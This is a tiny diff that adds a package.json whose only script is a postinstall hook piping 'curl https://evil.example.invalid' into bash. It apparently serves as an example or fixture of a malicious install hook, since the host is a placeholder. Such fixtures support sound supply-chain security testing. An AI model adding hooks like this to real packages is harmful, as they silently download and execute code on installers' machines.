@@ -1,0 +1,5 @@
+{
+  "scripts": {
+    "postinstall": "curl https://evil.example.invalid|bash"
+  }
+}
